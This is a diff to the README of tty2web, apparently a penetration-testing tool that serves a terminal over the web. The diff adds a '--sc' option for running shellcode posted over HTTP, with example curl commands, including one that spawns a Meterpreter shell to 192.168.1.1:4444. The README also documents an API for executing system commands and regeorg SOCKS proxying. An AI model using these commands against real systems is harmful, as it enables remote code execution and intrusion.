@@ -80,9 +80,11 @@ Point your web browser to <http://127.0.0.1:8000>
    --permit-write, -w            Permit clients to write to the TTY (BE CAREFUL) (default: false) [$TTY2WEB_PERMIT_WRITE]
    --credential value, -c value  Credential for Basic Authentication (ex: user:pass, default disabled) [$TTY2WEB_CREDENTIAL]
    --random-url, -r              Add a random string to the URL (default: false) [$TTY2WEB_RANDOM_URL]
+   --enable-webgl                Enable WebGL renderer (default: false) [$TTY2WEB_ENABLE_WEBGL]
    --all                         Turn on all features: download /, upload /, api, regeorg, ... (default: false) [$TTY2WEB_ALL]
    --api                         Enable API for executing commands on the system (BE CAREFUL!) (default: false) [$TTY2WEB_API]
-   --regeorg                     Enable socks/socks5 proxying using regeorg (default: false) [$TTY2WEB_REGEORG]
+   --sc                          Enable API for executing sc on the system (BE CAREFUL!) (default: false) [$TTY2WEB_SC]
+   --regeorg                     Enable socks4/socks5 proxy using regeorg (default: false) [$TTY2WEB_REGEORG]
    --random-url-length value     Random URL length (default: 8) [$TTY2WEB_RANDOM_URL_LENGTH]
    --url value                   Specify string for the URL [$TTY2WEB_URL]
    --download value              Serve files to download from specified dir [$TTY2WEB_DOWNLOAD]
@@ -115,7 +117,8 @@ Point your web browser to <http://127.0.0.1:8000>
    --close-signal value          Signal sent to the command process when tty2webclose it (default: SIGHUP) (default: 1) [$TTY2WEB_CLOSE_SIGNAL]
    --close-timeout value         Time in seconds to force kill process after client is disconnected (default: -1) (default: -1) [$TTY2WEB_CLOSE_TIMEOUT]
    --config value                Config file path (default: "~/.tty2web") [$TTY2WEB_CONFIG]
-   --version, -v                 print the version (default: false)
+   --help                        Displays help (default: false)
+   --version, -v                 print the version
 ```
 
 ### Config File
@@ -252,6 +255,30 @@ or with POST parameter:
 ```sh
 $ curl -d whoami http://127.0.0.1:8080/api/
 root
+```
+
+## SC support
+
+Start with:
+```sh
+$ tty2web --sc top
+```
+
+Now, you can execute sc within POST query parameter space:
+
+```sh
+$ curl -d "base64-encoded-string-with-sc"  -ivk http://127.0.0.1:8080/sc/
+root
+```
+
+or from file with POST parameter:
+```sh
+$ curl -d "@sc-127.0.0.1-4444.b64"  -ivk http://127.0.0.1:8080/sc/
+```
+
+spawn Meterpreter shell over https to 192.168.1.1:
+```sh
+$ curl -H 'Accept-Language: msf-https' -d '192.168.1.1:4444' http://127.0.0.1:8080/sc/
 ```
 
 ## Regeorg support
